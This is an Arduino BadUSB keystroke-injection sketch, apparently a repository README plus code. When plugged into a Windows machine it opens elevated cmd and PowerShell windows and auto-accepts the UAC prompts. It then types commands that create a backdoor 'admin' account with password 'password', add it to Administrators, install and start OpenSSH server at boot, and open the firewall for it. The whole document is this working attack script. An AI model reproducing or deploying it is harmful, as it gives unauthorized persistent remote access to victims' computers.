# BadUSB---Admin-SSH
BadUSB - Admin &amp; SSH
#include<Keyboard.h>
#define KEY_DELAY 50 //delay between keystrokes for slow computers

//a command line to execute
const char command0 [] = "powershell -Command Start-Process cmd -Verb RunAs"; // Launches cmd as admin
const char command1 [] = "net user admin password /add"; // Creates a new user by the name "admin" with password "password"
const char command2 [] = "net localgroup administrators admin /add"; // Adds the new user "admin" to the administrators group
const char command3 [] = "powershell Start-Process powershell -Verb runAs"; // Launches PowerShell as admin
const char command4 [] = "Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0"; // Installs OpenSSH server
const char command5 [] = "Start-Service sshd"; // Starts the SSH Server
const char command6 [] = "Set-Service -Name sshd -StartupType 'Automatic'"; // Sets the SSH service to start automatically
const char command7 [] = "Enable-NetFirewallRule -Name *OpenSSH-Server*"; // Creates a Firewall rule for SSH
const char command8 [] = "taskkill /IM cmd.exe"; // Closes CMD
const char command9 [] = "exit"; // Closes PowerShell


void setup() {
  Keyboard.begin();
  // I recommend that you leave a short delay before start while prototyping.
  // It will will give you some time to reprogram a board before it starts typing.
  delay(10000);
}

void loop() {
  //Pressing Win+r shortcut
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(KEY_DELAY);
  Keyboard.releaseAll();
  delay(KEY_DELAY*5); //Inputting cmd command
  Keyboard.println("cmd");
  delay(KEY_DELAY*5); //A delay to ensure that cmd window has been opened
  delay(2000);
  Keyboard.println(command0); // Launches cmd as admin
  delay(5000);
  Keyboard.press(0x82);
  Keyboard.press('Y'); //Presses Left Alt + Y to select Yes at the pop-up prompt
  delay(KEY_DELAY);
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.println(command1); // Creates a new user by the name "admin" with password "password"
  delay(2000);
  Keyboard.println(command2); // Adds the new user "admin" to the administrators group
  delay(2000);
  Keyboard.println(command3); // Launches PowerShell as admin
  delay(3000);
  Keyboard.press(0x82);
  Keyboard.press('Y'); //Presses Left Alt + Y to select Yes at the pop-up prompt
  delay(KEY_DELAY);
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.println(command4); // Installs OpenSSH server
  delay(15000);
  Keyboard.println(command5); // Starts the SSH Server
  delay(2000);
  Keyboard.println(command6); // Sets the SSH service to start automatically
  delay(2000);
  Keyboard.println(command7); // Creates a Firewall rule for SSH
  delay(2000);
  Keyboard.println(command8); // Closes CMD
  delay(2000);
  Keyboard.println(command9); // Closes PowerShell
  delay(1000);
}
